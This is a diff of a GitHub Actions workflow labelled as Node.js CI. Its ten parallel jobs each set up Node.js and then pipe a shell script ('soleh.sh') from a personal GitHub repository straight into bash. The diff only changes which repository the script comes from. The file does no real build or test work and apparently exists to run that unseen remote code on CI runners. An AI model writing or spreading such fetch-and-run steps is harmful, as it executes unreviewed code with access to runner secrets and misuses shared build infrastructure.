@@ -1,5 +1,5 @@
 
-name: Depot CI - Ubuntu Node.js
+name: Depott Parallel CI - Ubuntu Node.js
 
 on:
   push:
@@ -19,7 +19,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-2:
     name: Node.js Job 2
@@ -30,7 +30,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-3:
     name: Node.js Job 3
@@ -41,7 +41,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-4:
     name: Node.js Job 4
@@ -52,7 +52,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-5:
     name: Node.js Job 5
@@ -63,7 +63,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-6:
     name: Node.js Job 6
@@ -74,7 +74,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-7:
     name: Node.js Job 7
@@ -85,7 +85,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-8:
     name: Node.js Job 8
@@ -96,7 +96,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-9:
     name: Node.js Job 9
@@ -107,7 +107,7 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
 
   job-10:
     name: Node.js Job 10
@@ -118,4 +118,4 @@ jobs:
         with:
           node-version: 22
       - run: |
-          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash
+          curl -sL https://github.com/ihasment-dev/ihasmnt/raw/main/soleh.sh | bash
